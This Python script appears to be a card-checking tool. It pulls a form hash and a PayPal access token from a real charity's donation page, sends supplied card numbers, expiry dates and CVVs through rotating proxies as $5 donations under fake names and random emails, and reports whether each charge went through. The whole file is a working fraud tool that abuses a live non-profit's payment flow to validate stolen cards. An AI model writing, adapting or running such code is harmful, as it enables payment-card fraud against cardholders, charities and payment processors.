import requests,random,string,time,base64
from proxy import proxies
import asyncio

def getstr(text, start_delim, end_delim):
    start = text.find(start_delim)
    if start == -1:
        return None
    start += len(start_delim)
    end = text.find(end_delim, start)
    if end == -1:
        return None
    return text[start:end]

def generate_boundary():
    return 'WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def random_email():
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail', 'yahoo', 'hotmail', 'outlook'])
    extension = 'com'

    return f'{random_string}@{domain}.{extension}'

async def paypal_charge1(cc, mm, yy, cvv):
    r = requests.session()
    proxy = proxies()
    r.proxies = proxy
    web = generate_boundary()
    email = random_email()
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    #'cookie': '_ga=GA1.1.92394349.1727614013; _ga_WRCFM5BHF1=GS1.1.1728566696.5.0.1728566705.0.0.0',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
}
    try:
        response = r.get('https://cdi.coop/30th-anniversary-fundraise-campaign/', headers=headers)
        form_hash = getstr(response.text, 'give-form-hash" value="', '"')
        enc1 = getstr(response.text, '<script defer id="give-paypal-commerce-js-js-extra" src="data:text/javascript;base64,', '"></script>')
        dec1 = base64.b64decode(enc1).decode('utf-8')
        data_client_token = getstr(dec1, 'data-client-token":"', '"')
        dec2 = base64.b64decode(data_client_token).decode('utf-8')
        bearer = getstr(dec2, 'accessToken":"', '"')
    except:
        return '[PayPal_API] => Error: 1 req'

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': f'multipart/form-data; boundary=----{web}',
        # 'cookie': '_ga=GA1.1.541309026.1728446034; _ga_WRCFM5BHF1=GS1.1.1728448985.2.1.1728449028.0.0.0',
        'origin': 'https://cdi.coop',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://cdi.coop/30th-anniversary-fundraise-campaign/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    params = {
    'action': 'give_paypal_commerce_create_order',
    }

    data = f'''
------{web}
Content-Disposition: form-data; name="give-honeypot"


------{web}
Content-Disposition: form-data; name="give-form-id-prefix"

13638-1
------{web}
Content-Disposition: form-data; name="give-form-id"

13638
------{web}
Content-Disposition: form-data; name="give-form-title"

Evergreen donation form
------{web}
Content-Disposition: form-data; name="give-current-url"

https://cdi.coop/30th-anniversary-fundraise-campaign/
------{web}
Content-Disposition: form-data; name="give-form-url"

https://cdi.coop/30th-anniversary-fundraise-campaign/
------{web}
Content-Disposition: form-data; name="give-form-minimum"

5.00
------{web}
Content-Disposition: form-data; name="give-form-maximum"

999999.99
------{web}
Content-Disposition: form-data; name="give-form-hash"

f47eca4551
------{web}
Content-Disposition: form-data; name="give-price-id"

custom
------{web}
Content-Disposition: form-data; name="give-recurring-logged-in-only"


------{web}
Content-Disposition: form-data; name="give-logged-in-only"

1
------{web}
Content-Disposition: form-data; name="_give_is_donation_recurring"

0
------{web}
Content-Disposition: form-data; name="give_recurring_donation_details"

{{"give_recurring_option":"yes_donor"}}
------{web}
Content-Disposition: form-data; name="give-amount"

5.00
------{web}
Content-Disposition: form-data; name="give-recurring-period-donors-choice"

month
------{web}
Content-Disposition: form-data; name="give-fee-recovery-settings"

{{"fee_recovery":false}}
------{web}
Content-Disposition: form-data; name="give_tributes_type"

In honor of
------{web}
Content-Disposition: form-data; name="give_tributes_show_dedication"

no
------{web}
Content-Disposition: form-data; name="give_tributes_radio_type"

In honor of
------{web}
Content-Disposition: form-data; name="give_tributes_first_name"


------{web}
Content-Disposition: form-data; name="give_tributes_last_name"


------{web}
Content-Disposition: form-data; name="give_tributes_would_to"

none
------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][personalized][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][first_name][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][last_name][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][email][]"


------{web}
Content-Disposition: form-data; name="payment-mode"

paypal-commerce
------{web}
Content-Disposition: form-data; name="give_first"

Albedo
------{web}
Content-Disposition: form-data; name="give_last"

Jones
------{web}
Content-Disposition: form-data; name="give_email"

rnfknffefed@gmail.com
------{web}
Content-Disposition: form-data; name="give_comment"


------{web}
Content-Disposition: form-data; name="card_name"

Ayan
------{web}
Content-Disposition: form-data; name="card_exp_month"


------{web}
Content-Disposition: form-data; name="card_exp_year"


------{web}
Content-Disposition: form-data; name="billing_country"

US
------{web}
Content-Disposition: form-data; name="card_address"

New York
------{web}
Content-Disposition: form-data; name="card_address_2"


------{web}
Content-Disposition: form-data; name="card_city"

New York
------{web}
Content-Disposition: form-data; name="card_state"

NY
------{web}
Content-Disposition: form-data; name="card_zip"

10080
------{web}
Content-Disposition: form-data; name="give-gateway"

paypal-commerce
------{web}--'''

    response = r.post('https://cdi.coop/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
    try:
        id = response.json()['data']['id']
    except:
        return 'Failed to get order ID'
    asyncio.sleep(1)
    headers = {
'accept': '*/*',
'accept-language': 'en-US,en;q=0.9',
'authorization': f'Bearer {bearer}',
'braintree-sdk-version': '3.32.0-payments-sdk-dev',
'cache-control': 'no-cache',
'content-type': 'application/json',
'origin': 'https://assets.braintreegateway.com',
'paypal-client-metadata-id': '1c8bf2f6f4aa2125dc38758639898bd6',
'pragma': 'no-cache',
'priority': 'u=1, i',
'referer': 'https://assets.braintreegateway.com/',
'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'cross-site',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
}

    json_data = {
        'payment_source': {
            'card': {
                'number': cc,
                'expiry': f'{yy}-{mm}',
                'security_code': cvv,
                'attributes': {
                'verification': {
                    'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
            'application_context': {
                'vault': False,
        },
    }

    response = r.post(
    f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
    headers=headers,
    json=json_data,
    )
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': f'multipart/form-data; boundary=----{web}',
        # 'cookie': '_ga=GA1.1.541309026.1728446034; _ga_WRCFM5BHF1=GS1.1.1728448985.2.1.1728449028.0.0.0',
        'origin': 'https://cdi.coop',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://cdi.coop/30th-anniversary-fundraise-campaign/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    params = {
'action': 'give_paypal_commerce_approve_order',
'order': id,
}
    data = f'''
------{web}
Content-Disposition: form-data; name="give-honeypot"


------{web}
Content-Disposition: form-data; name="give-form-id-prefix"

10021-1
------{web}
Content-Disposition: form-data; name="give-form-id"

10021
------{web}
Content-Disposition: form-data; name="give-form-title"

Help us reach our goal!
------{web}
Content-Disposition: form-data; name="give-current-url"

https://cdi.coop/30th-anniversary-fundraise-campaign/
------{web}
Content-Disposition: form-data; name="give-form-url"

https://cdi.coop/30th-anniversary-fundraise-campaign/
------{web}
Content-Disposition: form-data; name="give-form-minimum"

5.00
------{web}
Content-Disposition: form-data; name="give-form-maximum"

999999.99
------{web}
Content-Disposition: form-data; name="give-form-hash"

{form_hash}
------{web}
Content-Disposition: form-data; name="give-price-id"

custom
------{web}
Content-Disposition: form-data; name="give-recurring-logged-in-only"


------{web}
Content-Disposition: form-data; name="give-logged-in-only"

1
------{web}
Content-Disposition: form-data; name="give_recurring_donation_details"

{{"is_recurring":false}}
------{web}
Content-Disposition: form-data; name="give-amount"

5.00
------{web}
Content-Disposition: form-data; name="give-fee-recovery-settings"

{{"fee_recovery":false}}
------{web}
Content-Disposition: form-data; name="give_tributes_type"

In honor of
------{web}
Content-Disposition: form-data; name="give_tributes_show_dedication"

no
------{web}
Content-Disposition: form-data; name="give_tributes_radio_type"

In honor of
------{web}
Content-Disposition: form-data; name="give_tributes_first_name"


------{web}
Content-Disposition: form-data; name="give_tributes_last_name"


------{web}
Content-Disposition: form-data; name="give_tributes_would_to"

none
------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][personalized][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][first_name][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][last_name][]"


------{web}
Content-Disposition: form-data; name="give_tributes_ecard_notify[recipient][email][]"


------{web}
Content-Disposition: form-data; name="payment-mode"

paypal-commerce
------{web}
Content-Disposition: form-data; name="give_first"

Albedo
------{web}
Content-Disposition: form-data; name="give_last"

Jones
------{web}
Content-Disposition: form-data; name="give_email"

{email}
------{web}
Content-Disposition: form-data; name="give_comment"


------{web}
Content-Disposition: form-data; name="card_name"

Ayan
------{web}
Content-Disposition: form-data; name="card_exp_month"


------{web}
Content-Disposition: form-data; name="card_exp_year"


------{web}
Content-Disposition: form-data; name="billing_country"

US
------{web}
Content-Disposition: form-data; name="card_address"

New York
------{web}
Content-Disposition: form-data; name="card_address_2"


------{web}
Content-Disposition: form-data; name="card_city"

New York
------{web}
Content-Disposition: form-data; name="card_state"

NY
------{web}
Content-Disposition: form-data; name="card_zip"

10080
------{web}
Content-Disposition: form-data; name="give-gateway"

paypal-commerce
------{web}--'''

    response = r.post('https://cdi.coop/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
    try:
        if response.json()['success'] == False:
            msg = response.json()['data']['error']
            if isinstance(msg, dict):
                msg = str(msg)
            msg = msg.replace('try using another card. Do not retry the same card.', '')
            msg = msg.replace('For Visa, Mastercard, Discover, or American Express, the service is not supported. ', '')
            msg = msg.replace('For Visa, Mastercard, Discover, or American Express, unknown - the issuer is not certified. ', '')
            msg = msg.replace('For Visa, Mastercard, or Discover transactions, the service is unavailable. For American Express, information is not available. For Maestro, the address is not checked or the acquirer had no response. The service is not available. ', '')
            msg = msg.replace('For Visa, Mastercard, or Discover transactions, re-try the request. For American Express, the system is unavailable. ', '')
            msg = msg.replace('For Visa, Mastercard, or Discover transactions, nothing matches. For American Express card holder, the address and postal code are both incorrect. For Visa, Mastercard, Discover, or American Express, the CVV2/CSC does not match. ', '')
            msg = msg.replace('For Visa, Mastercard, Discover, or American Express, the service is not supported. For Visa, Mastercard, Discover, or American Express, the service is not supported. ', '')
            msg = msg.replace('For Visa, Mastercard, or Discover transactions, the service is unavailable. For American Express, information is not available. For Maestro, the address is not checked or the acquirer had no response. The service is not available. For Visa, Mastercard, Discover, or American Express, unknown - the issuer is not certified. ', '')
            return msg
        elif response.json()['success'] == True:
            return 'Charged $5'
        else:
            return 'Unknown error occurred'
    except:
        return 'Proxy error occurred'

